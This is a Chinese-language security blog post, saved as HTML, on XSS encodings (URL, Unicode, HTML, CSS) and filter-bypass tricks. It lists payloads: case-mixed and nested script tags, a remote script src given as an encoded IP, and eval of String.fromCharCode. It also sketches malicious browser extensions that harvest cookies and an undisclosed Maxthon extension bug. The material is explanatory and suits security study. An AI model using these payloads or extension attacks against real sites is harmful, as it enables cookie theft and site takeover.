@@ -1,0 +1,243 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XSS编码与绕过 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="XSS编码与绕过 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="URL编码
+URL只允许用US-ASCII字符集中可打印的字符(0x20—0x7x)，其中某些字符在HTTP协议里有特殊的意义，所以有些也不能使用。这里有个需要注意的，+加号代表URL编码的空格，%20也是。
+URL编码最长见的是在用GET..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              XSS编码与绕过
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h4 id="url编码">URL编码</h4>
+<p>URL只允许用US-ASCII字符集中可打印的字符(0x20—0x7x)，其中某些字符在HTTP协议里有特殊的意义，所以有些也不能使用。这里有个需要注意的，+加号代表URL编码的空格，%20也是。</p>
+<p>URL编码最长见的是在用GET/POST传输时，顺序是把字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)。</p>
+<h4 id="unicode编码">unicode编码</h4>
+<p>Unicode有1114112个码位，也就是说可以分配1114112个字符。Unicode编码的字符以%u为前缀，后面是这个字符的十六进制unicode的码点。</p>
+<p>Unicode编码之所以被本文提到，因为有的站点过滤了某些字符串的话，但是发现这个站点在后端验证字符串的时候，识别unicode编码，那我们就可以把我们的攻击代码来改成unicode编码形式，就可以绕过站点的过滤机制了。</p>
+<h4 id="html编码">HTML编码</h4>
+<p>HTML编码的存在就是让他在代码中和显示中分开， 避免错误。他的命名实体：构造是&amp;加上希腊字母，字符编码：构造是&amp;#加十进制、十六进制ASCII码或unicode字符编码，而且浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染。</p>
+<p>例如：</p>
+<pre><code>&lt;img src=&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#46;&amp;#112;&amp;#110;&amp;#103;/&gt;
+</code></pre>
+<p>可以正常显示。</p>
+<p>但是当你把src或者img进行html编码就不行了，例如：</p>
+<pre><code>&lt;img &amp;#115;&amp;#114;&amp;#99;=&amp;#108;&amp;#111;&amp;#103;&amp;#111;&amp;#46;&amp;#112;&amp;#110;&amp;#103;/&gt;
+</code></pre>
+<h4 id="css编码">CSS编码</h4>
+<p>这个不是太常用。就是/斜杠加上1-6位十六进制</p>
+<p>之前在IE5之前都可以用expression来调用js时，这个编码很有用。 现在大多都是用于CSS小图标。</p>
+<h4 id="常见的绕过方式">常见的绕过方式</h4>
+<pre><code>&lt;sCrIpt&gt;alert(1)&lt;/script&gt;
+&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;
+&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt; (需要利用waf的不完整性)
+&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;
+</code></pre>
+<p>标签属性=&quot;javascript:JS代码&quot;(只对支持js伪协议的属性起作用)</p>
+<pre><code>&lt;标签 on事件=&quot;js代码&quot;&gt;
+
+&lt;script
+woaini&gt;
+alert(123)
+&lt;/script
+woaini&gt;
+</code></pre>
+<p>浏览器下会把换行 TAB符当成空格，把后面的字符当做属性来解析</p>
+<p>等等，还有很多，其实本章说的不是太多。干干货也少的可怜。没办法我之前说的“杂谈绕过WAF”里说的太详细了，该说的都说了。我也不知道该说些什么。看看下一节吧，还有些干货。XSS绕过方面网上的资料太多太多了。想要说一些别人没说的很难。也有，只不过在http://www.freebuf.com/articles/web/54686.html 里说完了...</p>
+<p>0x07 插件安全</p>
+<p>这节本是不属于本章的，所以说这节我是特意拿出来的。也是在这里我希望大家从此注意下浏览器插件方面的安全问题。</p>
+<p>我之前在《杂谈如何绕过WAF》一文里 还有现在朋友交流的时候我也多次说过。</p>
+<p>即使你网站做的再安全，WAF再怎么完整。我利用插件照样可以绕过。插件的有它的特殊性，也是这个特殊性成就了他的安全问题，那就是“跨域”。</p>
+<p>我在里说下插件是如何渲染到页面的：</p>
+<p>用户打开网站——发送数据包——服务器响应并发送Response包——浏览器收到Response包——渲染(先渲染Response包，再渲染插件的代码)<br>
+也就是说我在插件里写了一段js，那么用户安装后，凡是打开网站。浏览器渲染后，就可以获取用户的cookies。如果攻击者事先有准备，还可以利用csrf攻击。这里我们大胆假设下：</p>
+<p>假设1：攻击者把XSS代码封装到插件里，上传到浏览器插件下载网站(管理不严，管理员根本不可能一行一行代码看)，上传成功后。用户下载，并安装。那么攻击者就可以坐在电脑前，喝着咖啡，看着不断刷新的xss数据流...</p>
+<p>假设2：攻击者拥有dedecms的csrf(可以添加管理员)，后面的和假设1一样。当网站管理员不小心安装或者使用了带有插件浏览器，网站就会被攻击者控制。有些人会问，几率那么小，怎么可能跑到我身上。是不太可能跑到你身上，倒是有可能跑到其他站长身上，当你想想中国站长有多少时，相信你就会明白了</p>
+<p>假设3：攻击者拥有某个浏览器插件的XSC漏洞，再结合插件安全问题，就可以实现用户打开某个网站，就会被不知不觉中安装插件，有些人会说，有XSC我就直接执行任意代码了，谁还蛋疼式的去安装插件。如果攻击者想隐蔽式的攻击呢？而且控制电脑获取cookies我想这个应该比直接安装插件更加麻烦吧？当然攻击者也可以两个同时进行。</p>
+<p>当然了，也有很多人会说，我安装安全健康绿色无污染的插件不就不怕了吗。</p>
+<p>楼主说的十分有理，只不过你忽视了插件本身的安全问题，我之前所说的都是利用插件的特殊性来完成攻击，可是我并没有说插件本身的安全。</p>
+<p>这时恐怕又有人质疑了，插件即使不安全，那也需要用户输入特殊的字符串里完成攻击，你这不就是在自己插自己么。</p>
+<p>我所说的插件安全问题指的不是这，而是控制插件的数据流。因为插件的安全问题本身就没多大的利用价值，大多数时候都是自己插自己。</p>
+<p>假设有一个在线翻译的插件，鼠标滑词，自动翻译。而这个技术就需要利用到AJAX，而AJAX利用的就是厂商提供的API，而API很多时候都在二级域名，安全性相对来说就比较低了。如果控制API了，那么就可以控制API发送给插件的数据流，从而达到攻击。</p>
+<p>流程图就是下面这样：</p>
+<p>黑客发现插件调取的API网站安全漏洞——重写了发送的数据包——插件获取被重写API数据——解析并把恶意代码渲染到页面——攻击成功。<br>
+当然了，不止API，有的插件还调用了外部的JS、CSS、iframe(HTML)等，我们也可以控制他们里来完成攻击。</p>
+<p>为了让大家感到插件问题是时候注意下了，我放出一个小漏洞吧，之前在JSEC沙龙演示过的。危害不算太大，不过让大家从此注意插件问题应该够了。</p>
+<p>遨游浏览器漏洞打包.rar</p>
+<p>双击ceshi.mxaddon文件就行了(需要安装遨游浏览器)。ceshi目录里是源代码，def.json是遨游插件漏洞(打开遨游插件管理页面，就会弹窗。Test.js也就是我这节说的。当你打开任何网站的时候，他都会弹窗)。</p>
+<p>谁想提交就提交吧，当然我相信这时候遨游安全团队已经看到并修复了。我就喜欢看一群黑客和修复漏洞人员互相比速度。<br>
+相信这时有人开始骂我了。没办法，我就是不喜欢提交，任性。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#url%E7%BC%96%E7%A0%81">URL编码</a></li>
+<li><a href="#unicode%E7%BC%96%E7%A0%81">unicode编码</a></li>
+<li><a href="#html%E7%BC%96%E7%A0%81">HTML编码</a></li>
+<li><a href="#css%E7%BC%96%E7%A0%81">CSS编码</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">常见的绕过方式</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/dnslog/">
+              <h3 class="post-title">
+                DNSlog
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
